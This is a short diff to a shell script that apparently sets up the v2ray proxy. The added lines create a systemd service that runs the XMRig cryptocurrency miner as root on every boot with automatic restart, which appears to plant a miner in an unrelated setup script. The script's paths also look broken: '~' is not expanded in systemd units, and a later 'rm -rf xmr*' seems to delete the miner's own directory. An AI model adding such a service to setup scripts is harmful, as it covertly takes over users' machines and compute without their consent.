@@ -43,6 +43,23 @@ cat > ~/v2ray/config.json<<EOL
 
 EOL
 
+sudo cat >/etc/systemd/system/xmrig.service <<EOL
+[Unit]
+Description=Xmrig Miner Service
+After=network.target
+
+[Service]
+WorkingDirectory=~/xmrig-6.22.2
+ExecStart=~/xmrig-6.22.2/xmrig
+Restart=always
+RestartSec=10
+KillSignal=SIGINT
+SyslogIdentifier=xmrig
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOL
 nohup ./v2ray run > v2ray.log 2>&1 &
 cd ~/
 rm -rf xmr*
